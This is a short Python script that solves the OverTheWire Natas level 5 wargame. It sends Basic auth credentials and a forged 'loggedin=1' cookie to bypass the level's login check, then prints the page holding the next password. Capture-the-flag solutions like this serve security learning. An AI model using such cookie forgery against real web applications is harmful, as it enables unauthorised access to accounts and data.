import requests
import time

url = "http://natas5.natas.labs.overthewire.org/"
auth = ("natas5", "secret")

my_cookie = {"loggedin": "1"}

response = requests.get(url=url, cookies=my_cookie, auth=auth)

print(f"[*]Injecting the cookie {my_cookie}")

time.sleep(2)

if "access granted" in response.text.lower():
    print("[+]Finally! Your password here!")
    time.sleep(1.5)
    print(response.text)
else:
    print("[-]Something went wrong!")